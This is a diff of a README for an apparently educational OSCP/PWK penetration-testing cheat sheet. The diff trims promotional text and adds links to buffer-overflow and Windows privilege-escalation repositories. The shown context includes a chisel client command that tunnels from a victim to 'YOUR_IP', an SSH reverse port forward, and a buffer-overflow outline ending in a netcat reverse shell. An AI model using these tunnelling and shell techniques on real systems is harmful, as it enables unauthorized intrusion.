@@ -1,22 +1,15 @@
 # JustTryHarder
 
 JustTryHarder, a cheat sheet which will aid you through the PWK course & the OSCP Exam.
-
 (Inspired by PayloadAllTheThings)
 
-Feel free to submit a Pull Request & leave a star to share some love if this helped you. 💖
-
-**Hacktoberfest friendly!**
-Yes, we are open to Pull Requests for Hacktoberfest! Please ensure its not spam and actually contributes well to this repo. Thanks & happy hacking!
-
-Disclaimer: None of the below includes spoilers for the PWK labs / OSCP Exam.
-
-Credit Info:
+Credit Info by s1nfulz:
 I have obtained a lot of this info through other Github repos, blogs, sites and more.
 I have tried to give as much credit to the original creator as possible, if I have not given you credit please contact me on Twitter: https://twitter.com/s1nfulz
 
-## BOF (WIP)
+## BOF 
 ----------------
+https://github.com/Scr1ptK1ddie/Buffer_Overflow  
 (Typical bad characters include: 0x00, 0x0A, 0x0D)
 - Fuzzing
 - Finding eip position
@@ -24,6 +17,7 @@ I have tried to give as much credit to the original creator as possible, if I ha
 - Locating jmp esp
 - Generating payload with msfvenom
 - Getting reverse shell with netcat
+
 
 Good BOF resources: 
 - https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/june/writing-exploits-for-win32-systems-from-scratch/
@@ -197,6 +191,7 @@ int main(){
 ```
 
 Priv Esc - Windows
+https://github.com/Scr1ptK1ddie/WindowsPrivEsc	
 ----------------
  - [Windows Privilege Escalation Fundamentals](http://www.fuzzysecurity.com/tutorials/16.html)
  - [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
@@ -242,9 +237,6 @@ victim:
 ```
 ./chisel client YOUR_IP:8080 R:1234:127.0.0.1:1234
 ```
-
-Plink
-- WIP
 
 SSH
 - ssh user@10.10.10.10 -R 1234:127.0.0.1:1234
@@ -561,24 +553,5 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 To find World Writeable Directories in Linux use the command:
 ```find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print```
 
-Todo List:
-----------------
-- Improve the readability of the cheatsheet
-- Fill in the empty sections
-- Remove unnecessary sections
-- Integrate the files in the repo into the cheatsheet
-- Migrate to GitBook
-- Include screenshots/gifs into the cheatsheet if needed
 
-Thank you:
-----------------
-# Thanks to these people for including my cheatsheet on their site/page:
-- https://khaoticdev.net/cheatsheets/#ad
-- https://www.facebook.com/ncybersec/posts/1541830509321001
-- https://www.facebook.com/cyberg0100/posts/github-sinfulzjusttryharder-justtryharder-a-cheat-sheet-which-will-aid-you-throu/653235345249466
-- https://www.reddit.com/r/CyberSpaceVN/comments/f3n2wp/github_sinfulzjusttryharder_justtryharder_a_cheat
-- https://xn4k.github.io/pentest/PWK-course-&-the-OSCP-Exam-Cheatsheet/
-- https://opensourcelibs.com/libs/pentesting-tools
-- https://gitmemory.com/brhannah
-- https://www.bugbountytips.tech/2020/08/23/justtryharderpwk-cheatsheetkali-linux-cheatsheethydra-cheatsheetsecu-2/
 - 
